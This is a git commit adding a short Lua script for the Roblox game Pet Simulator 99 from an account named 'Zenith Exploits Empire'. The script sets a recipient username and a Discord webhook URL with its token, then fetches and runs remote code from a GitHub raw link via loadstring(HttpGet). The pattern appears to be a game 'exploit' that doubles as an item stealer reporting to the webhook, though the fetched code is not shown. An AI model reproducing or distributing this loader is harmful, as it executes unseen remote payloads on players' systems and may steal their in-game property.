c962d52f7977bed151a7b9d5275c7bab079e8bde
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 15:45:40 +0200

    Added ps99 script: ZENITH

---
+++ ps99/ZENITH.lua
@@ -0,0 +1,5 @@
+Username = "BloxBaconYutubePlayz"
+Username2 = "BloxBaconYutubePlayz"
+Webhook = "https://discord.com/api/webhooks/1364235201185710141/znYZZChiWOfKxHsIaM8y2bas6-qjO_ORvhLWR8xCPG0sVJ5R7QGAzmuqI131PlefzW4D"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
